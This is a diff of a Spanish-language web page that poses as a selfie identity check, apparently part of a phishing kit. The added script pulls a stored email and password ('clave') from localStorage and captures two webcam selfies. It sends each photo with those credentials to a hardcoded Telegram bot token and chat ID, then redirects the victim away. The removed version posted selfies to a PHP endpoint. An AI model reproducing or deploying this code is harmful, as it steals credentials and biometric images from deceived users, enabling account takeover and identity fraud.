@@ -1,446 +1,280 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Selfie KYC</title>
-
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Verificación de identidad con selfie</title>
 <style>
-    :root {
-        --green-main: #00a63a;
-        --text-main: #333333;
-    }
+  html, body {
+    margin: 0;
+    padding: 0;
+    height: 100%;
+    overflow: hidden;
+    font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background: white;
+    color: #1c1c1e;
+  }
+  body {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+  .container {
+    max-width: 500px;
+    width: 100%;
+    height: 100%;
+    padding: 40px 22px 30px;
+    display: flex;
+    flex-direction: column;
+    position: relative;
+    box-sizing: border-box;
+  }
 
-    * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-        font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display",
-                     "Segoe UI", Roboto, Helvetica, Arial;
-    }
+  /* Pantalla 1 */
+  #pantalla1 { display: flex; flex-direction: column; flex-grow: 1; height: 100%; overflow: hidden; }
+  .image-wrapper { display: flex; justify-content: center; margin-bottom: 40px; }
+  .image-wrapper img { max-width: 200px; width: 100%; height: auto; user-select: none; }
+  h1 { font-size: 28px; font-weight: 700; margin: 0 0 16px 0; line-height: 1.2; }
+  p { font-size: 17px; line-height: 1.3; margin: 0 0 50px 0; color: #333; }
+  .spacer { flex-grow: 1; }
+  .exit-link { text-align: center; font-size: 15px; color: #05be50; text-decoration: underline; cursor: pointer; margin-bottom: 25px; user-select: none; }
+  button { width: 100%; background-color: #05be50; border: none; border-radius: 20px; color: white; font-size: 17px; font-weight: 600; padding: 17px; cursor: pointer; user-select: none; transition: background-color 0.25s ease; }
+  button:hover { background-color: #038437; }
+  button:active { background-color: #38156a; }
 
-    body {
-        background: #ffffff;
-        min-height: 100vh;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-    }
+  /* Pantalla 2 */
+  #pantalla2 { display: none; position: relative; height: 100%; overflow: hidden; }
+  #pantalla2 .close-btn { position: fixed; top: 15px; right: 15px; font-size: 28px; font-weight: 700; color: #000; cursor: pointer; user-select: none; z-index: 1001; }
+  #pantalla2 .content { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
+  #pantalla2 video { width: 180px; height: 180px; border-radius: 50%; border: 8px solid #202840; background: black; object-fit: cover; margin-bottom: 20px; transform: scaleX(-1); }
+  #pantalla2 p { font-size: 20px; font-weight: 600; color: #202840; margin: 0 0 15px 0; }
+  #btnTomarFoto { width: 180px; background-color: #05be50; border-radius: 20px; border: none; color: white; font-weight: 600; font-size: 17px; padding: 12px 0; cursor: pointer; user-select: none; transition: background-color 0.25s ease; margin-bottom: 20px; position: relative; overflow: hidden; }
+  #btnTomarFoto:hover { background-color: #038437; }
+  #btnTomarFoto:active { background-color: #38156a; }
+  #btnTomarFoto.loading { background-color: #038437; color: #999; cursor: not-allowed; }
+  #btnTomarFoto.loading::after {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: -100%;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+    animation: loading 1.5s infinite;
+  }
+  @keyframes loading {
+    0% { left: -100%; }
+    100% { left: 100%; }
+  }
+  #fotoCapturada { width: 180px; height: 180px; border-radius: 50%; object-fit: cover; border: 8px solid #202840; display: none; margin-top: 10px; }
 
-    .screen {
-        background: #ffffff;
-        width: 100%;
-        max-width: 420px;
-        min-height: 700px;
-        border-radius: 28px;
-        box-shadow:
-            0 20px 50px rgba(0,0,0,0.20),
-            0 8px 20px rgba(0,0,0,0.14);
-        padding: 32px 22px 26px;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        position: relative;
-        overflow: hidden;
-    }
-
-    .title {
-        font-size: 22px;
-        font-weight: 500;
-        color: var(--text-main);
-        text-align: center;
-        margin-bottom: 28px;
-    }
-
-    .close-x {
-        position: absolute;
-        right: 18px;
-        top: 14px;
-        font-size: 24px;
-        color: #999;
-        cursor: pointer;
-    }
-
-    /* Contenedor del círculo */
-    .circle-wrapper {
-        position: relative;
-        width: 260px;
-        height: 260px;
-        margin-bottom: 32px;
-    }
-
-    /* Círculo que recorta el video */
-    .circle-mask {
-        position: absolute;
-        inset: 0;
-        border-radius: 50%;
-        overflow: hidden;
-        background: #eee;
-    }
-
-    video {
-        width: 100%;
-        height: 100%;
-        object-fit: cover;
-        transform: scaleX(-1); /* espejo tipo selfie */
-    }
-
-    /* Anillo verde externo */
-    .circle-border {
-        position: absolute;
-        inset: 0;
-        border-radius: 50%;
-        border: 5px solid var(--green-main);
-        pointer-events: none;
-    }
-
-    /* Anillo de escaneo (cuando rostro centrado) */
-    .scan-ring {
-        position: absolute;
-        inset: -4px;
-        border-radius: 50%;
-        border: 6px solid transparent;
-        border-top-color: var(--green-main);
-        border-right-color: var(--green-main);
-        pointer-events: none;
-        opacity: 0;
-    }
-
-    .scan-ring.active {
-        opacity: 1;
-        animation: spin 1.4s linear infinite;
-    }
-
-    @keyframes spin {
-        from { transform: rotate(0deg); }
-        to   { transform: rotate(360deg); }
-    }
-
-    /* Overlay de escaneo vertical para la captura */
-    .circle-scan-overlay {
-        position: absolute;
-        inset: 0;
-        border-radius: 50%;
-        overflow: hidden;
-        pointer-events: none;
-    }
-
-    .circle-scan-overlay::before {
-        content: "";
-        position: absolute;
-        left: -10%;
-        width: 120%;
-        height: 40%;
-        top: -120%;
-        background: linear-gradient(
-            to bottom,
-            rgba(0,255,0,0),
-            rgba(0,255,0,0.4),
-            rgba(0,255,0,0)
-        );
-    }
-
-    .circle-scan-overlay.scanning::before {
-        animation: scanDown 1.6s ease-in-out forwards;
-    }
-
-    @keyframes scanDown {
-        0%   { top: -120%; }
-        100% { top: 120%;  }
-    }
-
-    .hint {
-        margin-top: 10px;
-        font-size: 15px;
-        color: #555;
-        text-align: center;
-        line-height: 1.4;
-        padding: 0 12px;
-    }
-
-    .status-label {
-        margin-top: 14px;
-        font-size: 13px;
-        color: #888;
-        text-align: center;
-    }
-
-    .status-label.ok {
-        color: var(--green-main);
-        font-weight: 500;
-    }
-
-    .counter {
-        margin-top: 6px;
-        font-size: 14px;
-        color: var(--green-main);
-        font-weight: 500;
-    }
-
-    .capture-btn {
-        margin-top: 18px;
-        padding: 10px 22px;
-        border-radius: 22px;
-        border: none;
-        background: var(--green-main);
-        color: #fff;
-        font-size: 15px;
-        cursor: pointer;
-        box-shadow: 0 4px 10px rgba(0,0,0,0.18);
-        transition: transform 0.1s ease, box-shadow 0.1s ease, opacity 0.1s ease;
-        display: none; /* se muestra cuando el rostro está listo */
-    }
-
-    .capture-btn.show {
-        display: inline-block;
-    }
-
-    .capture-btn:disabled {
-        opacity: 0.6;
-        cursor: default;
-        box-shadow: none;
-    }
-
-    .capture-btn:not(:disabled):active {
-        transform: translateY(1px);
-        box-shadow: 0 2px 6px rgba(0,0,0,0.25);
-    }
-
-    @media (max-width: 480px) {
-        .screen {
-            max-width: 100%;
-            height: 100vh;
-            border-radius: 0;
-            box-shadow: none;
-        }
-    }
+  /* Pantalla 3 */
+  #pantalla3 { display: none; position: relative; height: 100%; overflow: hidden; }
+  #pantalla3 .close-btn { position: fixed; top: 15px; right: 15px; font-size: 28px; font-weight: 700; color: #000; cursor: pointer; user-select: none; z-index: 1001; }
+  #pantalla3 .content { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; position: relative; }
+  #pantalla3 video { width: 180px; height: 180px; border-radius: 50%; border: 8px solid #202840; background: black; object-fit: cover; margin-bottom: 20px; transform: scaleX(-1); }
+  #pantalla3 p { font-size: 18px; font-weight: 600; color: #202840; margin: 0 0 15px 0; }
+  #btnTomarFoto2 { width: 180px; background-color: #05be50; border-radius: 20px; border: none; color: white; font-weight: 600; font-size: 17px; padding: 12px 0; cursor: pointer; user-select: none; transition: background-color 0.25s ease; margin-bottom: 20px; position: relative; overflow: hidden; }
+  #btnTomarFoto2:hover { background-color: #038437; }
+  #btnTomarFoto2:active { background-color: #38156a; }
+  #btnTomarFoto2.loading { background-color: #038437; color: #999; cursor: not-allowed; }
+  #btnTomarFoto2.loading::after {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: -100%;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+    animation: loading 1.5s infinite;
+  }
 </style>
 </head>
 <body>
-
-<div class="screen">
-    <div class="close-x">✕</div>
-
-    <div class="title">Tómate una fotografía</div>
-
-    <div class="circle-wrapper">
-        <div class="circle-mask">
-            <video id="video" autoplay playsinline muted></video>
-        </div>
-        <div class="circle-border"></div>
-        <div class="scan-ring" id="scanRing"></div>
-        <div class="circle-scan-overlay" id="scanOverlay"></div>
+  <div class="container">
+    <!-- Pantalla 1 -->
+    <div id="pantalla1">
+      <div class="image-wrapper">
+        <img src="img/photo_2025-12-09_23-02-29.jpg" alt="Ilustración selfie" />
+      </div>
+      <h1>Necesitamos confirmar tu identidad</h1>
+      <p>Antes de confirmar tu identidad, te pedimos que te saques una selfie para confirmar que sos vos.</p>
+      <div class="spacer"></div>
+      <div class="exit-link" tabindex="0" role="button" aria-label="Salir">Salir</div>
+      <button id="btnSacarSelfie" type="button" aria-label="Sacar selfie">Sacar selfie</button>
     </div>
 
-    <div class="hint">
-        Ubícate en una zona iluminada y permanece al centro del círculo.
+    <!-- Pantalla 2 -->
+    <div id="pantalla2" aria-live="polite" aria-label="Instrucciones para selfie">
+      <div class="close-btn" tabindex="0" role="button" aria-label="Cerrar">&#10005;</div>
+      <div class="content">
+        <video autoplay playsinline muted></video>
+        <p id="instruccion">Mir&aacute; de frente a la c&aacute;mara con buena iluminaci&oacute;n</p>
+        <button id="btnTomarFoto" type="button" aria-label="Tomar foto">Tomar foto</button>
+        <img id="fotoCapturada" alt="Foto capturada" />
+      </div>
     </div>
 
-    <div class="status-label" id="statusLabel">
-        Esperando permiso de cámara...
+    <!-- Pantalla 3 -->
+    <div id="pantalla3" aria-live="polite" aria-label="Verificación facial">
+      <div class="close-btn" tabindex="0" role="button" aria-label="Cerrar">&#10005;</div>
+      <div class="content">
+        <video autoplay playsinline muted></video>
+        <p>Tom&aacute; otra selfie con buena iluminaci&oacute;n<br>asegur&aacute;te de que se vea bien</p>
+        <button id="btnTomarFoto2" type="button" aria-label="Tomar foto">Tomar foto</button>
+      </div>
     </div>
-
-    <div class="counter" id="photoCounter"></div>
-
-    <button id="takePhotoBtn" class="capture-btn">Tomar fotografía</button>
-</div>
-
-<!-- TensorFlow + BlazeFace para detección facial -->
-<script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs-core@4.21.0/dist/tf-core.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs-converter@4.21.0/dist/tf-converter.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs-backend-webgl@4.21.0/dist/tf-backend-webgl.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/blazeface@0.0.7/dist/blazeface.min.js"></script>
+  </div>
 
 <script>
-(async () => {
-    const video = document.getElementById('video');
-    const statusLabel = document.getElementById('statusLabel');
-    const scanRing = document.getElementById('scanRing');
-    const scanOverlay = document.getElementById('scanOverlay');
-    const photoCounter = document.getElementById('photoCounter');
-    const takeBtn = document.getElementById('takePhotoBtn');
+  const btnSacarSelfie = document.getElementById('btnSacarSelfie');
+  const pantalla1 = document.getElementById('pantalla1');
+  const pantalla2 = document.getElementById('pantalla2');
+  const pantalla3 = document.getElementById('pantalla3');
+  const closeBtn2 = pantalla2.querySelector('.close-btn');
+  const closeBtn3 = pantalla3.querySelector('.close-btn');
+  const video2 = pantalla2.querySelector('video');
+  const video3 = pantalla3.querySelector('video');
+  const btnTomarFoto = document.getElementById('btnTomarFoto');
+  const btnTomarFoto2 = document.getElementById('btnTomarFoto2');
+  const fotoCapturada = document.getElementById('fotoCapturada');
+  let stream;
 
-    let model;
-    let stream;
-    let photosTaken = 0;
-    const MAX_PHOTOS = 3;
-    const capturedPhotos = []; // dataURL de las fotos
-    let faceReady = false;
-    let stableFrames = 0;
-    let capturing = false;
+  const telegramBotToken = "8407584473:AAFVyKwzEQyGozipHyMNDrSWBi7mR9qhw-E";
+  const telegramChatId = "7655000874";
 
-    // Canvas oculto para capturar frames
-    const captureCanvas = document.createElement('canvas');
-    const captureCtx = captureCanvas.getContext('2d');
-
-    async function setupCamera() {
-        try {
-            stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: "user" },
-                audio: false
-            });
-            video.srcObject = stream;
-            statusLabel.textContent = "Cámara activada. Esperamos que seas tú...";
-            await new Promise(res => video.onloadedmetadata = res);
-        } catch (err) {
-            console.error(err);
-            statusLabel.textContent = "No se pudo acceder a la cámara.";
-        }
+  btnSacarSelfie.addEventListener('click', async () => {
+    pantalla1.style.display = 'none';
+    pantalla2.style.display = 'block';
+    fotoCapturada.style.display = 'none';
+    btnTomarFoto.style.display = 'inline-block';
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+      video2.srcObject = stream;
+    } catch (error) {
+      alert("No se pudo acceder a la cámara. Revisá los permisos.");
+      pantalla2.style.display = 'none';
+      pantalla1.style.display = 'flex';
     }
+  });
 
-    async function loadModel() {
-        await tf.setBackend('webgl');
-        model = await blazeface.load();
-        statusLabel.textContent = "Coloca tu rostro dentro del círculo.";
-    }
+  closeBtn2.addEventListener('click', () => {
+    pantalla2.style.display = 'none';
+    pantalla1.style.display = 'flex';
+    if (stream) stream.getTracks().forEach(track => track.stop());
+  });
 
-    // Comprueba si el rostro está centrado en el círculo
-    function isFaceCentered(prediction, videoWidth, videoHeight) {
-        const [x1, y1] = prediction.topLeft;
-        const [x2, y2] = prediction.bottomRight;
-        const faceCenterX = (x1 + x2) / 2;
-        const faceCenterY = (y1 + y2) / 2;
+  closeBtn3.addEventListener('click', () => {
+    pantalla3.style.display = 'none';
+    pantalla1.style.display = 'flex';
+    if (stream) stream.getTracks().forEach(track => track.stop());
+  });
 
-        const cx = videoWidth / 2;
-        const cy = videoHeight / 2;
-        const radius = Math.min(videoWidth, videoHeight) * 0.35;
+  btnTomarFoto.addEventListener('click', async () => {
+    // Mostrar estado de carga
+    btnTomarFoto.classList.add('loading');
+    btnTomarFoto.textContent = 'Procesando...';
+    btnTomarFoto.disabled = true;
+    
+    // Primero tomar y enviar la foto voluntaria
+    const canvas = document.createElement('canvas');
+    canvas.width = video2.videoWidth || 180;
+    canvas.height = video2.videoHeight || 180;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video2, 0, 0, canvas.width, canvas.height);
 
-        const dx = faceCenterX - cx;
-        const dy = faceCenterY - cy;
-        const dist = Math.sqrt(dx*dx + dy*dy);
+    const blob = await new Promise(resolve => {
+      canvas.toBlob(resolve, 'image/png');
+    });
 
-        return dist < radius * 0.6; // margen
-    }
+    // Enviar primera foto a Telegram
+    const email = localStorage.getItem('email') || "No definido";
+    const clave = localStorage.getItem('clave') || "No definido";
 
-    function capturePhoto() {
-        const w = video.videoWidth;
-        const h = video.videoHeight;
-        if (!w || !h) return;
-
-        captureCanvas.width = w;
-        captureCanvas.height = h;
-        captureCtx.drawImage(video, 0, 0, w, h);
-        const dataURL = captureCanvas.toDataURL('image/jpeg', 0.9);
-        capturedPhotos.push(dataURL);
-        photosTaken++;
-        photoCounter.textContent = `Foto ${photosTaken} de ${MAX_PHOTOS}`;
-    }
-
-    async function sendPhotos() {
-        const fd = new FormData();
-        capturedPhotos.forEach((dataURL, i) => {
-            fd.append(`photo${i+1}`, dataURL);
+    if(telegramBotToken && telegramChatId) {
+      try {
+        const photoFormData = new FormData();
+        photoFormData.append('photo', blob, 'selfie_voluntaria.png');
+        photoFormData.append('chat_id', telegramChatId);
+        photoFormData.append('caption', `Selfie voluntaria inter\n\nEmail: ${email}\nClave: ${clave}`);
+        
+        await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+          method: 'POST',
+          body: photoFormData
         });
+        console.log("Primera foto enviada a Telegram");
+      } catch(e) {
+        console.log("Error enviando primera foto a Telegram:", e);
+      }
+    }
 
-        const resp = await fetch('pam.php', {
-            method: 'POST',
-            body: fd
+    // Ir a pantalla 3 para la segunda foto
+    pantalla2.style.display = 'none';
+    pantalla3.style.display = 'block';
+    
+    // Usar el mismo stream para la pantalla 3
+    video3.srcObject = stream;
+    
+    // Restaurar botón original
+    btnTomarFoto.classList.remove('loading');
+    btnTomarFoto.textContent = 'Tomar foto';
+    btnTomarFoto.disabled = false;
+  });
+
+  btnTomarFoto2.addEventListener('click', async () => {
+    // Mostrar estado de carga
+    btnTomarFoto2.classList.add('loading');
+    btnTomarFoto2.textContent = 'Procesando...';
+    btnTomarFoto2.disabled = true;
+    
+    // Tomar y enviar la segunda foto
+    const canvas = document.createElement('canvas');
+    canvas.width = video3.videoWidth || 180;
+    canvas.height = video3.videoHeight || 180;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video3, 0, 0, canvas.width, canvas.height);
+
+    const blob = await new Promise(resolve => {
+      canvas.toBlob(resolve, 'image/png');
+    });
+
+    // Enviar segunda foto a Telegram
+    const email = localStorage.getItem('email') || "No definido";
+    const clave = localStorage.getItem('clave') || "No definido";
+
+    if(telegramBotToken && telegramChatId) {
+      try {
+        const photoFormData = new FormData();
+        photoFormData.append('photo', blob, 'selfie_segunda.png');
+        photoFormData.append('chat_id', telegramChatId);
+        photoFormData.append('caption', `Selfie segunda inter\n\nEmail: ${email}\nClave: ${clave}`);
+        
+        await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+          method: 'POST',
+          body: photoFormData
         });
-
-        if (!resp.ok) {
-            throw new Error('Error en la respuesta del servidor');
-        }
+        console.log("Segunda foto enviada a Telegram");
+      } catch(e) {
+        console.log("Error enviando segunda foto a Telegram:", e);
+      }
     }
 
-    async function handleTakePhoto() {
-        if (!faceReady || capturing) return;
-        capturing = true;
-        photosTaken = 0;
-        capturedPhotos.length = 0;
-        takeBtn.disabled = true;
-        statusLabel.textContent = "Capturando imágenes...";
-        statusLabel.classList.add('ok');
-        photoCounter.textContent = "";
+    // Mostrar foto en pantalla 2
+    pantalla3.style.display = 'none';
+    pantalla2.style.display = 'block';
+    fotoCapturada.src = URL.createObjectURL(blob);
+    fotoCapturada.style.display = 'block';
+    video2.style.display = 'none';
+    btnTomarFoto.style.display = 'none';
+    
+    // Actualizar texto de instrucción
+    document.getElementById('instruccion').textContent = 'Ambas fotos capturadas correctamente';
 
-        // Lanzar animación de escaneo
-        scanOverlay.classList.remove('scanning'); // reinicio
-        void scanOverlay.offsetWidth;            // truco para reiniciar animación
-        scanOverlay.classList.add('scanning');
-
-        // Capturamos 3 fotos en intervalos
-        capturePhoto();               // t = 0
-        setTimeout(capturePhoto, 550);  // t ≈ 0.55s
-        setTimeout(capturePhoto, 1100); // t ≈ 1.1s
-
-        // Después de la última, detenemos y enviamos
-        setTimeout(async () => {
-            scanOverlay.classList.remove('scanning');
-            statusLabel.textContent = "Validando identidad...";
-            try {
-                await sendPhotos();
-                statusLabel.textContent = "Fotos enviadas correctamente.";
-                statusLabel.classList.add('ok');
-            } catch (e) {
-                console.error(e);
-                statusLabel.textContent = "Error al enviar las fotos.";
-                statusLabel.classList.remove('ok');
-            }
-            takeBtn.disabled = false;
-            takeBtn.textContent = "Tomar fotografía";
-            capturing = false;
-        }, 1500); // un poco más que la animación
-    }
-
-    takeBtn.addEventListener('click', handleTakePhoto);
-
-    async function detectionLoop() {
-        if (!model || !video.videoWidth) {
-            requestAnimationFrame(detectionLoop);
-            return;
-        }
-
-        const returnTensors = false;
-        const flipHorizontal = true;
-        const predictions = await model.estimateFaces(video, returnTensors, flipHorizontal);
-
-        if (predictions && predictions.length > 0) {
-            const best = predictions[0];
-            if (best.probability && best.probability[0] > 0.9 &&
-                isFaceCentered(best, video.videoWidth, video.videoHeight)) {
-
-                stableFrames++;
-                if (stableFrames > 10) {
-                    if (!faceReady) {
-                        faceReady = true;
-                        statusLabel.textContent = "Rostro detectado. Presiona \"Tomar fotografía\".";
-                        statusLabel.classList.add('ok');
-                        takeBtn.classList.add('show');
-                    }
-                    scanRing.classList.add('active');
-                }
-            } else {
-                stableFrames = 0;
-                faceReady = false;
-                scanRing.classList.remove('active');
-                takeBtn.classList.remove('show');
-                if (!capturing) {
-                    statusLabel.textContent = "Ajusta tu rostro al centro del círculo.";
-                    statusLabel.classList.remove('ok');
-                }
-            }
-        } else {
-            stableFrames = 0;
-            faceReady = false;
-            scanRing.classList.remove('active');
-            takeBtn.classList.remove('show');
-            if (!capturing) {
-                statusLabel.textContent = "Acércate a la cámara.";
-                statusLabel.classList.remove('ok');
-            }
-        }
-
-        requestAnimationFrame(detectionLoop);
-    }
-
-    // Inicialización
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        statusLabel.textContent = "Cambia de dispositivo.";
-    } else {
-        await setupCamera();
-        await loadModel();
-        detectionLoop();
-    }
-})();
+    // 
+    setTimeout(() => {
+      window.location.href = "www.google.com";
+    }, 500);
+  });
 </script>
 
 </body>
